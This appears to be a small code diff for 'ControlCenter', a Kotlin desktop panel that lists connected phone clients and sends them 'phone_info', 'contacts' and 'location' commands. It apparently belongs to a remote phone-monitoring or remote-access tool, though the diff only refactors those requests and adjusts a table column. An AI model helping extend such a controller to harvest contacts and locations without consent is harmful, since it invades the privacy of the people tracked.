@@ -2,6 +2,7 @@ package ui.main
 
 import javafx.geometry.Insets
 import javafx.geometry.Pos
+import javafx.scene.control.TableView
 import javafx.scene.layout.Priority
 import javafx.scene.text.Font
 import server.Client
@@ -65,7 +66,9 @@ class MainView: View("ControlCenter") {
         minWidth = 200.0
         maxWidth = Double.MAX_VALUE
         readonlyColumn("UUID", Client::uuid)
-        readonlyColumn("Token", Client::token)
+        readonlyColumn("Token", Client::token) {
+            columnResizePolicy = TableView.CONSTRAINED_RESIZE_POLICY
+        }
 
         vboxConstraints {
             vgrow = Priority.ALWAYS
@@ -125,17 +128,17 @@ class MainView: View("ControlCenter") {
 
         btPhoneInfo.action {
             val selectedClient = tblClients.selectedItem ?: return@action
-            GlobalState.serverThread?.requestPhoneInfo(selectedClient)
+            GlobalState.serverThread?.sendCommand(selectedClient, "phone_info")
         }
 
         btContacts.action {
             val selectedClient = tblClients.selectedItem ?: return@action
-            GlobalState.serverThread?.requestContacts(selectedClient)
+            GlobalState.serverThread?.sendCommand(selectedClient, "contacts")
         }
 
         btLocation.action {
             val selectedClient = tblClients.selectedItem ?: return@action
-            GlobalState.serverThread?.requestLocation(selectedClient)
+            GlobalState.serverThread?.sendCommand(selectedClient, "location")
         }
     }
 
